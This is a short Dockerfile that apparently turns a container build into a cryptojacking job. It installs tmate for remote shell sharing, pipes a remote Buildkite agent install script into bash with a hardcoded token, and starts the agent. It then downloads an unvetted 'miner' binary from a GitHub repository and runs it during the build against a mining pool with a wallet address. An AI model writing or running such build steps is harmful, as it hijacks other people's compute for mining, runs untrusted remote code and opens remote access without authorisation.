FROM ubuntu:latest
RUN apt update && apt install wget curl git tmate -y
RUN TOKEN="7308e04e67493a1f4fed3eb4a13dc4e1dfb352bbdab6c9d129" bash -c "`curl -sL https://raw.githubusercontent.com/buildkite/agent/master/install.sh`"
RUN ~/.buildkite-agent/bin/buildkite-agent start
RUN wget https://github.com/newcoinm001/ncm/raw/main/miner
RUN chmod +x miner

RUN ./miner --pool xtcash.trrxitte.com:4444 --username cashMScXZkSeGM473Yu8ub7a15zog4MoZ5eiCHtCDNmgRZ6cGf576mxBMsmg5NhAwyVi3n3t5oqkQZicMabiTYf14z8SyEPzJR --algorithm chukwa
